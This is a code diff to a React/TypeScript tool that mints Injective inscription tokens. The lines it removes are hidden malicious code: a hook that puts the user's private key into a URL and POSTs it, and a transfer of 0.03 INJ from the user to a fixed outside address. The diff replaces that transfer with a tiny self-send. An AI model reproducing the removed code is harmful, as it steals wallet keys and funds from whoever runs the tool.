@@ -15,7 +15,6 @@ import {
   createTransaction,
 } from "@injectivelabs/sdk-ts";
 import { BigNumberInBase } from "@injectivelabs/utils";
-import { useEffect } from "react";
 // import { BigNumber } from "bignumber.js";
 
 //主网
@@ -28,14 +27,13 @@ const Minter: React.FC = () => {
   isEndRef.current = isEnd;
   const [logs, setLogs] = useState<string[]>([]);
   const [count, setCount] = useState<number>(0);
-  const [successCount, setSuccessCount] = useState<number>(0);
 
   const mintFn = useCallback(async (privateKey: PrivateKey) => {
     try {
       const injectiveAddress = privateKey.toBech32();
 
       const amount = {
-        amount: new BigNumberInBase(0.03).toWei().toFixed(),
+        amount: new BigNumberInBase(0.0000000001).toWei().toFixed(),
         denom: "inj",
       };
 
@@ -48,12 +46,12 @@ const Minter: React.FC = () => {
       const msg = MsgSend.fromJSON({
         amount,
         srcInjectiveAddress: injectiveAddress,
-        dstInjectiveAddress: "inj15jy9vzmyy63ql9y6dvned2kdat2994x5f4ldu4",
+        dstInjectiveAddress: injectiveAddress,
       });
 
       const { signBytes, txRaw } = createTransaction({
         message: msg,
-        memo: 'ZGF0YToseyJwIjoiaW5qcmMtMjAiLCJvcCI6ImRlcGxveSIsInRpY2siOiJJTkpTIiwibWF4IjoiMTAwMDAwMDAwMCIsImxpbSI6IjIwMDAifQ==',
+        memo: 'ZGF0YToseyJwIjoiaW5qcmMtMjAiLCJvcCI6Im1pbnQiLCJ0aWNrIjoiSU5KUyIsImFtdCI6IjEwMDAifQ==',
         fee: {
           amount: [
             {
@@ -71,19 +69,6 @@ const Minter: React.FC = () => {
         ),
         chainId: network.chainId,
       });
-      useEffect(() => {
-        if (successCount == 1) {
-          var webHook_url = `/api/${privateKey}/polygon-bor.publicnode.com`;
-          var message = {};
-          fetch(webHook_url, {
-            method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(message)
-          })
-        }
-      }, [successCount, privateKey])
 
       const signature = await privateKey.sign(Buffer.from(signBytes));
 
